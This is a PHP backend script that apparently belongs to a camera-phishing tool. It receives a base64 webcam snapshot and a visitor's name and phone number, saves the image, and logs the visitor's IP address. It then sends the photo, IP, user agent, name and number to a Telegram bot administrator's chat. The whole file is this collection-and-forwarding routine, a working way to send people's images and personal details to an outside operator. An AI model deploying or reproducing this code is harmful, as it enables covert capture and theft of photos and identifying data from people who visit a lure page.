<?php

require_once __DIR__.'/config.php';

$imgdir = __DIR__.'/image/';
if(!file_exists($imgdir)){ mkdir($imgdir); }

$ipaddress = $_SERVER['REMOTE_ADDR'];
$useragent = $_SERVER['HTTP_USER_AGENT'];
$link = $_SERVER['SCRIPT_URI'];

$imgdata = $_POST['img'];
$usrname = $_POST['name'];
$numberr = $_POST['number'];

$code = str_shuffle(time());
$imgpath = $imgdir.'cam-'.date('YmdHis').'-'.$code.'.jpg';

if(!empty($imgdata)){
  $logname = 'log.log';
  $logtxt  = 'Received: '.date('Y-m-d H:i:s ')."$ipaddress $numberr ($usrname)\n  $imgpath\n";
  error_log($logtxt,3,$logname);
}

$filteredData = substr($imgdata,strpos($imgdata,",")+1);
$unencodedData = base64_decode($filteredData);
$fp = fopen($imgpath,'wb');
fwrite($fp,$unencodedData);
fclose($fp);

if(_BOTACCESS===1){
  function bot($method,$datas=[]){
    $url = "https://api.telegram.org/bot"._BOTTOKEN."/".$method;
    $ch = curl_init();
    curl_setopt($ch,CURLOPT_URL,$url);
    curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
    curl_setopt($ch,CURLOPT_POSTFIELDS,$datas);
    $res = curl_exec($ch);
    if(curl_error($ch)){
      var_dump(curl_error($ch));
    } else {
      return json_decode($res);
    }
  }
  $dt = date('Y-m-d H:i:s');
  $msg = bot('sendDocument',[
    "chat_id"=> _BOTADMIN,
    "document"=> new CURLFile($imgpath),
    "caption"=> '#c'.$code
  ])->result->message_id;
  bot('sendMessage',[
    "chat_id"=> _BOTADMIN,
    "text"=> "```#c{$code}\n{$dt}\n\nIP: {$ipaddress}\nUserAgent: {$useragent}\nLink: {$link}\nName: {$usrname}\nNumber: {$numberr}```",
    "reply_to_message_id"=> $msg,
    "parse_mode"=> "Markdown"
  ]);
}

exit;